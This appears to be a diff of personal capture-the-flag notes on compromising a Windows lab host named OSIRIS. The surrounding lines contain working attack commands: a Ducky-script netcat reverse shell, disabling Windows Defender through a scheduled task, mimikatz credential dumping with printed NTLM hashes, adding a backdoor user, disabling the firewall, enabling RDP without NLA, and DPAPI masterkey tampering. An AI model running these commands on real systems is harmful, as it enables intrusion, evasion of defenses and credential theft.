@@ -120,7 +120,6 @@ Nmap done: 1 IP address (1 host up) scanned in 138.08 seconds
 usage: connect host-name [port]
 tftp> connect 10.10.134.236
 
-
 https://github.com/UndedInside/DuckyScripts/blob/main/test_linux_forkbomb.txt
 
 REM Forkbomb to crash Linux machines
@@ -342,7 +341,6 @@ Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
 tftp> put na.txt
 Transfer timed out.
 
-
 not work, need to bypass AV
 
 I see it in my machine won't work , in attackbox yep :)
@@ -393,7 +391,6 @@ ENTER
 DELAY 1000
 STRING c:\windows\temp\nc.exe 10.10.119.139 17777 -e cmd
 ENTER
-
 
 tftp> put rev.txt
 Sent 323 bytes in 0.0 seconds
@@ -463,9 +460,7 @@ La variable de entorno $ExecutionContext.SessionState.LanguageMode representa el
 
 El modo de idioma se puede configurar en el archivo de configuración de PowerShell o mediante el cmdlet Set-ExecutionPolicy.
 
-
 It is likely that the CLM (Content Lifecycle Management) system has detected that the file is suspected of being malicious and has taken action to protect against it, such as activating antivirus protection or quarantining the file.
-
 
 ---
 
@@ -492,7 +487,6 @@ Running `dir /s c:\temp` would produce the following output:
 Copy code
 
  `Volume in drive C has no label.  Volume Serial Number is 24A6-9E61   Directory of c:\temp  09/23/2022  02:07 PM    <DIR>          folder1 09/23/2022  02:07 PM                12 file3.txt                1 File(s)             12 bytes                2 Dir(s)  78,481,656,576 bytes free  Directory of c:\temp\folder1  09/23/2022  02:07 PM                18 file1.txt 09/23/2022  02:07 PM                24 file2.txt                2 File(s)             42 bytes                0 Dir(s)  78,481,656,576 bytes free`
-
 
 ---
 
@@ -716,7 +710,6 @@ La orden wmic service obtiene información sobre los servicios del sistema, incl
 
 La opción "/i" hace que la búsqueda sea insensible a mayúsculas y minúsculas y la opción "/v" excluye las líneas que contienen la cadena especificada. Por lo tanto, la orden findstr busca los servicios que están configurados para iniciarse automáticamente (startmode "auto") y excluye aquellos cuyo archivo ejecutable esté ubicado en la carpeta "c:\windows" o que contengan dobles comillas.
 
-
 Checking access, shows we don’t have any write on the nordvpnservice
 
 c:\Program Files\IVPN Client>cacls "c:\program files\nordvpn"
@@ -742,7 +735,6 @@ c:\program files\NordVPN NT SERVICE\TrustedInstaller:(ID)F
                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                            GENERIC_READ
                                                                                                            GENERIC_EXECUTE
-
 
 But on the IVPN Service, we find that a user named "scheduler" has Write access
 
@@ -832,7 +824,6 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 Try the new cross-platform PowerShell https://aka.ms/pscore6
 
 PS C:\Temp> Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *
-
 
 PSComputerName          : OSIRIS
 Name                    : IVPN Client
@@ -965,7 +956,6 @@ $cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend
 
 This block of code creates a new scheduled task that will execute the `cmd.exe` program with the arguments `/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)`. This command disables the `windefend` service, which is part of the Windows Defender antivirus software, and sets the security descriptor for the service to `D:(D;;GA;;;WD)(D;;GA;;;OW)`. This effectively disables the service and prevents it from being restarted.
 
-
 ---
 
 $cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
@@ -987,7 +977,6 @@ TaskPath                                       Ta
                                                me
 --------                                       --
 \                                              Me
-
 
 We need to escalate our privileges before we can run this task. So as of now, we still have to try to keep things on the low-low so Defender doesn't stop us.
 
@@ -1135,7 +1124,6 @@ Para establecer el OutputPath, haga clic con el botón derecho en el proyecto en
 
 Para establecer el AssemblyName, vaya a la página Propiedades del proyecto y establezca el AssemblyName en el nombre que desee para el archivo ejecutable del proyecto.
 
-
 I'm uploading mine
 https://github.com/jesusgavancho/ivpn_osiris
 
@@ -1150,7 +1138,6 @@ Status   Name               DisplayName
 ------   ----               -----------          
 Running  IVPN Client        IVPN Client          
 
-
 PS C:\temp> powershell -c "Stop-Service -Name 'IVPN*' "
 powershell -c "Stop-Service -Name 'IVPN*' "
 PS C:\temp> cscript C:\script\update.vbs
@@ -1164,8 +1151,6 @@ dir "c:\program files\ivpn client\"|find "ivpn.exe"
 
 PS C:\temp> powershell -c "Restart-Service -Name 'IVPN*' "
 powershell -c "Restart-Service -Name 'IVPN*' "
-
-
 
 root@ip-10-10-214-187:~/test# nc -lvnp 17778
 Listening on [0.0.0.0] (family 0, port 17778)
@@ -1205,7 +1190,6 @@ Tamper protection es una característica de seguridad que protege los procesos y
 
 Un ejemplo de cómo funciona la protección contra modificaciones ilegales es cuando un usuario intenta desactivar el firewall de un sistema. Si la protección contra modificaciones ilegales está habilitada, el sistema no permitirá que el usuario desactive el firewall y mostrará un mensaje de error. De esta manera, se evita que el usuario pueda exponer el sistema a posibles ataques.
 
-
 Once we get our reverse shell, we will have `NT System` privilege, time to activate the schedule task we created previously to disable Windows Defender by using powershell command below:
 
 $svc = New-Object -ComObject 'Schedule.Service'
@@ -1214,7 +1198,6 @@ $user = 'NT SERVICE\TrustedInstaller'
 $folder = $svc.GetFolder('\')
 $task = $folder.GetTask('Meh')
 $task.RunEx($null, 0, 0, $user)
-
 
 ---
 
@@ -1231,7 +1214,6 @@ $task = $folder.GetTask('Meh')
 PS C:\Users\chajoh\Desktop> $task.RunEx($null, 0, 0, $user)
 $task.RunEx($null, 0, 0, $user)
 
-
 Name          : Meh
 InstanceGuid  : {8607C8BD-20DA-4B84-B299-196E52198668}
 Path          : \Meh
@@ -1239,12 +1221,10 @@ State         : 4
 CurrentAction : cmd.exe
 EnginePID     : 2256
 
-
 Then we issue a restart command using shutdown /r /t 0, make sure you only RESTART otherwise you will lost the access !
 
 PS C:\Users\chajoh\Desktop> cd C:\Windows\system32
 cd C:\Windows\system32
-
 
 PS C:\Windows\system32> ^C
 root@ip-10-10-141-30:~/test# nc -lvnp 17778
@@ -1270,7 +1250,6 @@ operable program or batch file.
 
 C:\Windows\system32>
 
-
 Checking status of Defender
 
 PS C:\Users\chajoh\Desktop> get-process -name "msmpeng"
@@ -1281,7 +1260,6 @@ At line:1 char:1
 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : ObjectNotFound: (msmpeng:String) [Get-Process], ProcessCommandException
     + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.GetProcessCommand
-
 
 Under the same user document folder - `C:\Users\chajoh\Documents`, we found a KeePass database - `Database.kdbx`
 
@@ -1454,7 +1432,6 @@ type C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml
 	<Custom />
 </Configuration>
 
-
 For now, we will need to get access to `chajoh` user, for this we will download mimikatz from our attacker machine to target computer and temporary inject our password to the user and TAKE A NOTE ON NTLM HASH.
 
 root@ip-10-10-141-30:~/test# locate mimikatz.exe
@@ -1462,9 +1439,7 @@ root@ip-10-10-141-30:~/test# locate mimikatz.exe
 /opt/Mimikatz/x64/mimikatz.exe
 root@ip-10-10-141-30:~/test# cp /opt/Mimikatz/x64/mimikatz.exe mimikatz.exe
 
-
 Invoke-WebRequest "http://10.10.103.96:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
-
 
 PS C:\Users\chajoh\Documents> Invoke-WebRequest "http://10.10.0.108:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
 Invoke-WebRequest "http://10.10.141.30:1234/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"
@@ -1473,9 +1448,7 @@ cd c:\temp
 PS C:\temp> dir
 dir
 
-
     Directory: C:\temp
-
 
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
@@ -1492,14 +1465,10 @@ mimikatz # lsadump::cache /user:chajoh /password:hackP@ssw0rd /kiwi
   * password : hackP@ssw0rd
   * ntlm     : 4c05b64dec614df2b522c401bb8d8994
 
-
-
-
 mimikatz # exit
 Bye!
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md
-
 
 net user witty Pssw0rd123 /add
 
@@ -1519,20 +1488,15 @@ PS C:\temp> netsh advfirewall set allprofiles state off
 netsh advfirewall set allprofiles state off
 Ok.
 
-
-
-
 Next we will need to enable Remote Desktop Service and Disable NLA (Network Level Authentication) by adding registry key using command below
 
 PS C:\temp> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 The operation completed successfully.
 
-
 PS C:\temp> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
 The operation completed successfully.
-
 
 ---
 ┌──(kali㉿kali)-[~]
@@ -1544,7 +1508,6 @@ The operation completed successfully.
 [23:56:23:265] [318193:318194] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
 [23:56:23:265] [318193:318194] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
 [23:56:25:356] [318193:318194] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_BUMP_OPTIONS]
-
 
 Next, we will need to logoff any existing Logon Session by using `logoff Session_ID` command as Windows only allow one logon session per computer unless otherwise configured.
 
@@ -1625,15 +1588,12 @@ Actually I did test CQURE then watch https://www.youtube.com/watch?v=7D_WUJJKZdQ
 
 I'll upload here
 
-
 ---
 
 *Evil-WinRM* PS C:\Users\WittyAle\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/mimikatz.exe -outfile mimikatz.exe
 *Evil-WinRM* PS C:\Users\WittyAle\Documents> dir
 
-
     Directory: C:\Users\WittyAle\Documents
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1704,7 +1664,6 @@ cd c:\temp
 Invoke-WebRequest "http://10.10.103.96:1234/nc.exe" -outfile "C:\temp\nc.exe"
 .\PrintSpoofer.exe -c ".\nc.exe -e cmd.exe 10.8.19.103 8888"
 
-
 mimikatz # privilege::debug                                            
 Privilege '20' OK
 
@@ -1758,7 +1717,6 @@ Supplemental Credentials:
     Credentials
       des_cbc_md5       : 1320543e800131c8
 
-
 RID  : 000003eb (1003)
 User : scheduler
   Hash NTLM: 641ca8dc1dc918cd16c054d4bcbb9edb
@@ -1784,7 +1742,6 @@ Supplemental Credentials:
     Default Salt : OSIRIS.WINDCORP.THMscheduler
     Credentials
       des_cbc_md5       : ae454aea7c57f7b3
-
 
 RID  : 000003ec (1004)
 User : hacker
@@ -1858,7 +1815,6 @@ Session: 65537 - RDP-Tcp
   state: Listen (6)
   user :  @ 
   lock : no
-
 
 mimikatz # sekurlsa::logonpasswords
 
@@ -2101,9 +2057,7 @@ PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/ntds_capi_0_07ea03b4-3b28
 PS C:\temp> dir
 dir
 
-
     Directory: C:\temp
-
 
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
@@ -2117,9 +2071,7 @@ PS C:\temp> Invoke-WebRequest http://10.10.103.96:1234/CQDPAPIBlobSearcher.exe -
 PS C:\temp> dir
 dir
 
-
     Directory: C:\temp
-
 
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
@@ -2259,14 +2211,11 @@ Enter Import Password: mimikatz.exe
 Enter Export Password:
 Verifying - Enter Export Password: cqure
 
-
 PS C:\Temp> Invoke-WebRequest http://10.10.103.96:1234/DMK2.pfx -o DMK2.pfx
 PS C:\Temp> ls
 ls
 
-
     Directory: C:\Temp
-
 
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
@@ -2297,13 +2246,10 @@ Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-55
 
 PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa.another"
 
-
 PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> dir -for
 dir -for
 
-
     Directory: C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125
-
 
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
@@ -2312,18 +2258,14 @@ Mode                 LastWriteTime         Length Name
 -a-hs-         9/11/2020  11:42 AM            908 BK-WINDCORP                                                          
 -a-hs-         9/11/2020  11:42 AM             24 Preferred                                                            
 
-
 Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
-
 
 PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
 Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
 PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> dir -for
 dir -for
 
-
     Directory: C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125
-
 
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
@@ -2332,12 +2274,9 @@ Mode                 LastWriteTime         Length Name
 -a-hs-         9/11/2020  11:42 AM            908 BK-WINDCORP                                                          
 -a-hs-         9/11/2020  11:42 AM             24 Preferred  
 
-
 Lastly, we need to run this command to make sure the new MasterKey is set with the correct attributes:
 
-
 attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
-
 
 Thanks Mr.Tom and (use Rdesktop in windows) to login
 
@@ -2354,14 +2293,5 @@ Was really fun!!
 :)
 
 ```
-
-![[Pasted image 20230103230422.png]]
-
-![[Pasted image 20230103235641.png]]
-
-![[Pasted image 20230106225619.png]]
-
-![[Pasted image 20230107091114.png]]
-
 
 [[Set]]
